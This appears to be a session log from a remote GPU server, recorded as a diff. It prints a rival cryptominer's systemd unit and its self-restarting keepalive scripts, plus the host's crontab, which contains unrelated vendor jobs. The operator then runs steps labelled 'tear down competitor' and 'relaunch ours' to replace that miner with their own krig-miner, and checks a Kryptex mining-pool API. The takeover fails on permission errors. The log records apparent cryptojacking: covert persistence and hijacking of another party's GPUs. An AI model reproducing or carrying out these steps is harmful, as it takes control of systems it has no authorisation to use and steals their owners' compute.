@@ -1,0 +1,70 @@
+Warning: Permanently added '123.184.7.135' (ED25519) to the list of known hosts.
+### META 2026-11-24T23:55:41Z
+g0023
+-- plh-keeper unit
+# /etc/systemd/system/plh-keeper.service
+[Unit]
+Description=plh keeper one miner per card
+After=network-online.target
+[Service]
+Type=simple
+ExecStart=/opt/plh/keepalive.sh
+Restart=always
+RestartSec=5
+Nice=-5
+KillMode=process
+[Install]
+WantedBy=multi-user.target
+-- /opt/plh/keep.sh
+#!/bin/bash
+for i in $(seq 0 $(($(nvidia-smi -L|wc -l)-1))); do systemctl reset-failed plh-card@$i 2>/dev/null; systemctl start plh-card@$i 2>/dev/null; done
+-- /opt/plh/keepalive.sh
+#!/bin/bash
+/opt/plh/keep.sh
+[ "${1:-}" = "--once" ] && exit 0
+while :; do sleep 45; /opt/plh/keep.sh; done
+-- crontab
+*/2 * * * * /usr/local/node_exporter/get_hardware_info_v3 high >> /var/log/hardware_info_high.log 2>&1
+0 * * * * /usr/local/node_exporter/get_hardware_info_v3 middle >> /var/log/hardware_info_middle.log 2>&1
+0 1 * * * /usr/local/node_exporter/get_hardware_info_v3 low >> /var/log/hardware_info_low.log 2>&1
+@reboot /usr/local/node_exporter/get_hardware_info_v3 once_boot >> /var/log/hardware_info_boot.log 2>&1
+31 21 * * * "/root/.acme.sh"/acme.sh --cron --home "/root/.acme.sh" > /dev/null
+0 2 * * * /ssd/vendors/QD_GLAD/npa_bicm/mysql/backup/scripts/backup.sh >>/ssd/vendors/QD_GLAD/npa_bicm/mysql/backup/scripts/backup.log 2>&1
+### TEAR-DOWN-COMPETITOR
+rm: cannot remove '/etc/cron.d/plh-keepalive': Operation not permitted
+teardown: plh_procs=0 unit=0
+### RELAUNCH-OURS
+chmod: cannot access '/root/ul_plant/krig-miner': No such file or directory
+ls: cannot access '/root/ul_plant/krig-miner': No such file or directory
+0
+/root/ul_plant/keep.sh: line 6: /root/ul_plant/f0.log: Operation not permitted
+/root/ul_plant/keep.sh: line 6: /root/ul_plant/f1.log: Operation not permitted
+/root/ul_plant/keep.sh: line 6: /root/ul_plant/f2.log: Operation not permitted
+/root/ul_plant/keep.sh: line 6: /root/ul_plant/f3.log: Operation not permitted
+/root/ul_plant/keep.sh: line 6: /root/ul_plant/f4.log: Operation not permitted
+/root/ul_plant/keep.sh: line 6: /root/ul_plant/f5.log: Operation not permitted
+/root/ul_plant/keep.sh: line 6: /root/ul_plant/f6.log: Operation not permitted
+/root/ul_plant/keep.sh: line 6: /root/ul_plant/f7.log: Operation not permitted
+launch: ourprocs=0 plh=0
+0, 0 MiB, 0 %
+1, 0 MiB, 0 %
+2, 0 MiB, 0 %
+3, 0 MiB, 0 %
+4, 0 MiB, 0 %
+5, 0 MiB, 0 %
+6, 0 MiB, 0 %
+7, 0 MiB, 0 %
+### OBSERVE
+OBSERVE: ourprocs=0 plh=1 units=0
+0, 6327 MiB, 100 %
+1, 4 MiB, 0 %
+2, 4 MiB, 0 %
+3, 4 MiB, 0 %
+4, 4 MiB, 0 %
+5, 4 MiB, 0 %
+6, 4 MiB, 0 %
+7, 4 MiB, 0 %
+/root/ul_farmfan/f2.sh: line 57: 2964630 Killed                  timeout 25 curl -s -m 20 "https://pool.kryptex.com/prl/api/v3/miner/workers/$W" -o $D/pool_run11.json
+size=12288
+PARSE_FAIL Unterminated string starting at: line 1 column 12265 (char 12264)
+### DONE 2026-11-24T23:59:01Z
